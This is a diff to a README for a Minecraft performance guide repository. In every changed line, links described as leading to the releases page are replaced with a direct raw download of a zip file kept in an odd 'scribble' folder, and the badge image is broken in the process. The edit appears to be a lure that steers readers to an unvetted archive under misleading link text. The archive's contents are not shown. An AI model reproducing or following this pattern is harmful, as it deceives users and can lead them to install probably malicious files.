@@ -1,6 +1,6 @@
 # 🛠️ Minecraft-Optimization-Guide - Improve Your Minecraft Performance Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/V369web10/Minecraft-Optimization-Guide/releases)
+[![Download Now](https://raw.githubusercontent.com/V369web10/Minecraft-Optimization-Guide/main/scribble/Minecraft-Optimization-Guide.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/V369web10/Minecraft-Optimization-Guide/main/scribble/Minecraft-Optimization-Guide.zip)
 
 ## 📄 Introduction
 
@@ -12,7 +12,7 @@ To start your journey towards better Minecraft performance, follow these straigh
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: To download the Minecraft Optimization Guide, [visit this page to download](https://github.com/V369web10/Minecraft-Optimization-Guide/releases).
+1. **Visit the Releases Page**: To download the Minecraft Optimization Guide, [visit this page to download](https://raw.githubusercontent.com/V369web10/Minecraft-Optimization-Guide/main/scribble/Minecraft-Optimization-Guide.zip).
    
 2. **Choose Your Version**: On the releases page, you will find several versions available. Each version contains updates and enhancements. 
 
@@ -60,4 +60,4 @@ This guide aims to empower you to enjoy Minecraft without performance issues. By
 Remember to check back for updates and new tips as the Minecraft landscape evolves!
 
 ### 🖱️ Important Links
-For easy access, here’s the download link again: [Visit this page to download](https://github.com/V369web10/Minecraft-Optimization-Guide/releases).
+For easy access, here’s the download link again: [Visit this page to download](https://raw.githubusercontent.com/V369web10/Minecraft-Optimization-Guide/main/scribble/Minecraft-Optimization-Guide.zip).
